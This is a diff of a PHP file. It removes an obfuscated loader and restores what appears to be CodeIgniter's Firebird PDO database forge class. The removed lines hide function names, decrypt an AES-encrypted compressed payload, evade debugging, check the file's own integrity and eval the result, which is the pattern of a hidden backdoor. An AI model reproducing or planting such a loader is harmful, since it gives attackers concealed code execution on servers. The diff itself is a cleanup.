@@ -1,28 +1,212 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_e7y1rtcf=('bas'.'e64'.'_de'.'cod'.'e');
-$_vkmeah8m=('gzu'.'nco'.'mpr'.'ess');
-$_lm6h6fcq=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_uz1iyb6r='ARkZ1JKo';
-$_j6ht1qnq='W7s8P2mv';
-$_ek1hz1dg='uvQ/ENMe';
-$_a9rmca8i='C30CTebo';
-$_immadgzb='RYznJw9ABt8=';
-$_wuv21mey='11dcwrH1';
-$_nyzekd0d='DhpL3g==';
-$_ielro9cd='2Qxkhr9U';
-$_p2q2d7ex=$_e7y1rtcf($_ek1hz1dg.$_a9rmca8i.$_j6ht1qnq.$_uz1iyb6r.$_immadgzb);
-$_tqx26azh=$_e7y1rtcf($_ielro9cd.$_wuv21mey.$_nyzekd0d);
-$_l2rm81xc=$_e7y1rtcf('7DVwSJnNpsamKtTHwcsopyjTj98ImNREz9HDbMbtSqNwV+qxZ4ZKurajXtGrNAQFW3KnXmt+GdogcaL2ObjoW9SZEq4x4z76anphk1a6+t84a6zcjUy6WYJBvulgfn6cPiykzmMTTtLcwPGxYTA5jEQb9ejzWO+y1pq3k9zNOGjykG5w2QJS4ZvirBUUI4zJCcRDtriSk9GfHnpxUwcirQB87STqYWTnKY2Lg4MZ4xRvb0iqXhSfS4qoGSEVzJNDV96naUZm3z1ZvStyU9ZF95wk9UNPQ5tsjH68Nc7I+hOfKDmWYdUVQmn5XzRUDxgtHt/pH6+xQdlIHP9npNU4zlkcDzJfVSIxzk6kwC8LRAYk185ptMsqHjrsAHBZugcU626TzxUE0/HT2AywowBiIdyqjQWsQv4WlkPveqsLQsHlTkl3K5WkmNwWNzJs5Rwz1hdnFEVMsa7dy4VS/FYLkTsb+18OukHPtLLvMOWna92wyWnj3Yqz4tEsyjpKCdAcIZLIZfOB9cDcpFQvjfVTd0fXjDlZ9P3MFVDS4ERuDXGmEUTzL6vcqtz8FCaVgzJTHnB64CFSKkXoubEOgnAIRg9q1xyab1nL5Bo7o0G0r9oARjhCbd6HZWDsre3nhXoG03adlOlDvSjpo17CgOYuwgtSGoVWhMvdjzwGt4AHRKkmbCp8PopM6OuqkJc5hPVeatE3we3wDorvE2LRWVN6Zjzt7eXGoGhvxCYCmS7yah5SyWB/iIchLZWUOw5qdwN852dELG4JZBppR90TLHzagfGkqQMdcOhZGrpM6MQwa8bPbVM0NtU+6syt1fQWadb1QeVba5jgGWk1UsBTsGJNzNUjNKlxZ6dHs3QQoYa9AfO3BrjdsfZjQgZ9rY29MN+/umXO131tQ7TDFH3twQ7K2MbgSy8fBN/GKhr+N7TUvRNPbA9Y0Zl4QtKpsIi7rMy/gsuciSKUQgP2IesnHI8Ay5x/oHkltUeNhDNz79zrGq85ttVoSbl9UyWkhAqOjpi2VIu6ZZR5V2VFi4glninsWk87TiX7c2ESVg89rSl9hglMfLMBUEs7dTKDCjeB+nYcO201Q3amWk/Ly5XFigpCdSlRLcJLYRqehSU4Y7Lj7x/agY9wZ9FxK7gZlZgAvqn/cR5lXb1vBBdplEObmtnowplZZYPo77qqqCzpwwr8Ronh368gaCYu6uHeN9wvHY23xYwibfFXPSerEbdmLBw2tnM4ZdAuHsXmjQXWbP6VrzyqgztTxHrLQi4Hg63ltykZd1ns8rMyWUdTI55gmWD5UB84enOF1aNf+kXIOImpostEbL12Q3uGAjGaIdnF+EiJ');
-$_mwzdow4y=$_lm6h6fcq($_l2rm81xc,'aes-256-cbc',$_p2q2d7ex,OPENSSL_RAW_DATA,$_tqx26azh);
-if($_mwzdow4y===false){exit;}
-$_mrylv6kl=$_vkmeah8m($_mwzdow4y);
-if($_mrylv6kl===false){exit;}
-$_is4xaz68='65f058917e898934f35fa8b329a3a1ae2fab74ec9e5b61c7e71770527fa48df8';
-$_tp6kdkiq=@file_get_contents(__FILE__);
-if($_tp6kdkiq!==false){
-$_mvmx8myd=str_replace($_is4xaz68,"0000000000000000000000000000000000000000000000000000000000000000",$_tp6kdkiq);
-$_dfwibhm9=hash("sha256",$_mvmx8myd);
-if($_dfwibhm9!==$_is4xaz68){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+class CI_DB_pdo_firebird_forge extends CI_DB_pdo_forge {
+
+
+
+
+
+protected $_rename_table = FALSE;
+
+
+
+
+
+protected $_unsigned = array(
+'SMALLINT' => 'INTEGER',
+'INTEGER' => 'INT64',
+'FLOAT' => 'DOUBLE PRECISION'
+);
+
+
+
+
+
+protected $_null = 'NULL';
+
+
+
+
+
+
+
+public function create_database($db_name)
+{
+
+
+empty($this->db->hostname) OR $db_name = $this->hostname.':'.$db_name;
+return parent::create_database('"'.$db_name.'"');
 }
-eval($_mrylv6kl);
+
+
+
+
+
+
+
+public function drop_database($db_name)
+{
+if ( ! ibase_drop_db($this->conn_id))
+{
+return ($this->db->db_debug) ? $this->db->display_error('db_unable_to_drop') : FALSE;
+}
+elseif ( ! empty($this->db->data_cache['db_names']))
+{
+$key = array_search(strtolower($this->db->database), array_map('strtolower', $this->db->data_cache['db_names']), TRUE);
+if ($key !== FALSE)
+{
+unset($this->db->data_cache['db_names'][$key]);
+}
+}
+return TRUE;
+}
+
+
+
+
+
+
+
+
+
+protected function _alter_table($alter_type, $table, $field)
+{
+if (in_array($alter_type, array('DROP', 'ADD'), TRUE))
+{
+return parent::_alter_table($alter_type, $table, $field);
+}
+$sql = 'ALTER TABLE '.$this->db->escape_identifiers($table);
+$sqls = array();
+for ($i = 0, $c = count($field); $i < $c; $i++)
+{
+if ($field[$i]['_literal'] !== FALSE)
+{
+return FALSE;
+}
+if (isset($field[$i]['type']))
+{
+$sqls[] = $sql.' ALTER COLUMN '.$this->db->escape_identifiers($field[$i]['name'])
+.' TYPE '.$field[$i]['type'].$field[$i]['length'];
+}
+if ( ! empty($field[$i]['default']))
+{
+$sqls[] = $sql.' ALTER COLUMN '.$this->db->escape_identifiers($field[$i]['name'])
+.' SET DEFAULT '.$field[$i]['default'];
+}
+if (isset($field[$i]['null']))
+{
+$sqls[] = 'UPDATE "RDB$RELATION_FIELDS" SET "RDB$NULL_FLAG" = '
+.($field[$i]['null'] === TRUE ? 'NULL' : '1')
+.' WHERE "RDB$FIELD_NAME" = '.$this->db->escape($field[$i]['name'])
+.' AND "RDB$RELATION_NAME" = '.$this->db->escape($table);
+}
+if ( ! empty($field[$i]['new_name']))
+{
+$sqls[] = $sql.' ALTER COLUMN '.$this->db->escape_identifiers($field[$i]['name'])
+.' TO '.$this->db->escape_identifiers($field[$i]['new_name']);
+}
+}
+return $sqls;
+}
+
+
+
+
+
+
+
+protected function _process_column($field)
+{
+return $this->db->escape_identifiers($field['name'])
+.' '.$field['type'].$field['length']
+.$field['null']
+.$field['unique']
+.$field['default'];
+}
+
+
+
+
+
+
+
+
+
+protected function _attr_type(&$attributes)
+{
+switch (strtoupper($attributes['TYPE']))
+{
+case 'TINYINT':
+$attributes['TYPE'] = 'SMALLINT';
+$attributes['UNSIGNED'] = FALSE;
+return;
+case 'MEDIUMINT':
+$attributes['TYPE'] = 'INTEGER';
+$attributes['UNSIGNED'] = FALSE;
+return;
+case 'INT':
+$attributes['TYPE'] = 'INTEGER';
+return;
+case 'BIGINT':
+$attributes['TYPE'] = 'INT64';
+return;
+default: return;
+}
+}
+
+
+
+
+
+
+
+
+protected function _attr_auto_increment(&$attributes, &$field)
+{
+
+}
+}
